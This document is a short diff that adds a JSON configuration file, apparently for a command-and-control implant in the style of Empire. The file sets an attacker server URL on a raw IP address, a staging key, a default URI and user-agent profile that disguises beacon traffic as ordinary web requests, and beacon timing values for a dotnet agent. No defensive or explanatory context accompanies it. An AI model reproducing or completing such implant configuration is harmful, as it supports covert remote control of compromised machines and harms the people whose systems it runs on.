@@ -1,0 +1,14 @@
+{
+  "serverUrl": "http://85.137.252.226/",
+  "stagingKey": "LnfL01zYqj8ttAslfDKZkolb5CXFNvxn",
+  "workingHours": "",
+  "profile": "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+  "killDate": "",
+  "defaultDelay": 5,
+  "defaultJitter": 0.0,
+  "defaultLostLimit": 60,
+  "language": "dotnet",
+  "defaultResponse": "{{ REPLACE_DEFAULTRESPONSE}}",
+  "privateKeyBase64": "",
+  "publicKeyBase64": ""
+}
